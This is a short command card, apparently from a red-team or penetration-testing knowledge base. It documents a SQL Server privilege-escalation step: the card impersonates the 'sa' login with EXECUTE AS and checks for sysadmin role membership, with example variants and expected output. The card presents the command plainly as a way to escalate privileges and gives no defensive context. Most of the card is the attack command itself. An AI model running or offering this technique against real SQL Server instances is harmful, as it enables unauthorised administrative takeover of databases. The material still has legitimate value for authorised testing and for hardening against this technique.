---
id: 3eb1d655-8ee4-40a8-ad34-9cf23a622f9f
name: mssql-execute-as-sa-and-check-sysadmin
type: command
executor: sql
data: |-
  EXECUTE AS LOGIN = 'sa';
  SELECT IS_SRVROLEMEMBER('sysadmin');
output: null
created_at: '2023-04-06T03:56:21.083530+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - SQL Server
tags:
  - mssql
  - impersonation
  - privilege-escalation
verified: true
validated: true
---

# mssql-execute-as-sa-and-check-sysadmin

## Command

```sql
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Description

This SQL command sequence impersonates the 'sa' login and then checks sysadmin role membership. Use it to escalate privileges in a nested impersonation scenario.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'sa' | Target login to impersonate (system administrator) | Yes |

## Examples

### Basic Usage

```sql
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
```

### With Revert

```sql
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
REVERT;
```

## Expected Output

First, impersonation success (no output), then:

1  (confirming sysadmin access)

## Related

- [[procedures/Nested-Impersonation-Privilege-Escalation-in-SQL-Server]]
